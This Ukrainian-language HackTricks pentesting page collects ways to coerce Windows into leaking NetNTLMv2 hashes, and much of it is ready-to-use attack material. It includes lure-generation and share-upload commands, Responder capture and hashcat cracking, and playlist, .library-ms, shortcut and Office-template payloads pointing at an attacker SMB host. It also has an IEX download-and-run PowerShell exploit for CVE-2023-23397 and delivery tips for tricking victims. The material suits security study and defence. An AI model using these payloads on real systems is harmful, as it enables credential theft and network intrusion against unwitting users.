# Місця для крадіжки NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — від завантаження microsoft word файлу онлайн до ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md і [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **write to a share that users or scheduled jobs browse in Explorer**, покладіть файли, чиї метадані вказують на ваш UNC (e.g. `\\ATTACKER\share`). Відкриття папки викликає **implicit SMB authentication** і leaks a **NetNTLMv2** to your listener.

1. **Generate lures** (покриває SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Drop them on the writable share** (будь-яка папка, яку жертва відкриває):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows може одночасно опитувати кілька файлів; все, що Explorer попередньо переглядає (`BROWSE TO FOLDER`), не потребує жодних кліків.

### Windows Media Player списки відтворення (.ASX/.WAX)

Якщо ви змусите ціль відкрити або переглянути контрольований вами список відтворення Windows Media Player, ви можете leak Net‑NTLMv2, вказавши запис на UNC path. WMP спробує завантажити вказане медіа через SMB і автоматично автентифікуватиметься.

Приклад payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Потік збору та cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer неналежним чином обробляє файли .library-ms, коли їх відкривають безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений UNC-шлях (наприклад, \\attacker\share), просте перегортання/запуск .library-ms всередині ZIP змушує Explorer перерахувати UNC і відправити NTLM-автентифікаційні дані атакуючому. Це дає NetNTLMv2, який можна зламати офлайн або потенційно relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Операційні кроки
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Шлях звуку нагадування календаря Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows обробляв розширену MAPI властивість PidLidReminderFileParameter у елементах календаря. Якщо ця властивість вказувала на UNC path (e.g., \\attacker\share\alert.wav), Outlook контактував зі SMB share коли спрацьовує нагадування, leaking Net‑NTLMv2 користувача без будь‑якого кліку. Це було виправлено 14 March, 2023, але все ще дуже актуально для legacy/untouched fleets та для історичного incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Сторона Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Примітки
- Жертві достатньо, щоб Outlook for Windows був запущений у момент спрацьовування нагадування.
- The leak дає Net‑NTLMv2, придатний для offline cracking або relay (не pass‑the‑hash).


### .LNK/.URL на основі іконки zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки ярликів. Недавні дослідження показали, що навіть після патчу Microsoft у квітні 2025 для UNC‑icon shortcuts все ще було можливо спровокувати NTLM authentication без кліків, розмістивши ціль ярлика на UNC path та зберігши іконку локально (обхід патчу отримав CVE‑2025‑50154). Просте переглядання папки змушує Explorer отримувати метадані з віддаленої цілі, відправляючи NTLM на attacker SMB server.

Мінімальний Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload ярлика програми (.lnk) через PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Покладіть shortcut у ZIP і змусьте жертву переглянути його.
- Помістіть shortcut на мережевий ресурс з правами запису, який жертва відкриє.
- Поєднайте з іншими lure файлами в тій самій папці так, щоб Explorer робив preview елементів.

### Без кліку .LNK NTLM leak через шлях іконки ExtraData (CVE‑2026‑25185)

Windows завантажує `.lnk` metadata під час **перегляду/preview** (рендер іконки), а не лише при виконанні. CVE‑2026‑25185 демонструє шлях парсингу, де блоки **ExtraData** змушують shell розвʼязувати шлях іконки та торкатися filesystem **під час завантаження**, що викликає outbound NTLM, якщо шлях віддалений.

Ключові умови тригера (спостерігаються в `CShellLink::_LoadFromStream`):
- Включити **DARWIN_PROPS** (`0xa0000006`) в ExtraData (вхід у процедуру оновлення іконки).
- Включити **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) з заповненим **TargetUnicode**.
- Loader розгортає змінні оточення в `TargetUnicode` і викликає `PathFileExistsW` для отриманого шляху.

Якщо `TargetUnicode` розвʼязується в UNC шлях (наприклад, `\\attacker\share\icon.ico`), **лише перегляд папки**, що містить ярлик, спричинить outbound аутентифікацію. Той самий шлях завантаження також може бути викликаний **indexing** та **AV scanning**, що робить це практичною поверхнею no‑click leak.

Інструменти для досліджень (парсер/генератор/UI) доступні в проєкті **LnkMeMaybe** для побудови/інспекції цих структур без використання Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office документи можуть посилатися на зовнішній template. Якщо ви вкажете прикріплений template як UNC шлях, відкриття документа аутентифікує до SMB.

Мінімальні зміни DOCX relationship (inside word/):

1) Редагуйте word/settings.xml і додайте посилання на прикріплений template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Відредагуйте файл word/_rels/settings.xml.rels і вкажіть rId1337 на ваш UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Перепакуйте в .docx і доставте. Запустіть ваш SMB capture listener і чекайте на відкриття.

Для ідей після захоплення щодо relaying або зловживання NTLM, перегляньте:

{{#ref}}
README.md
{{#endref}}


## Посилання
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
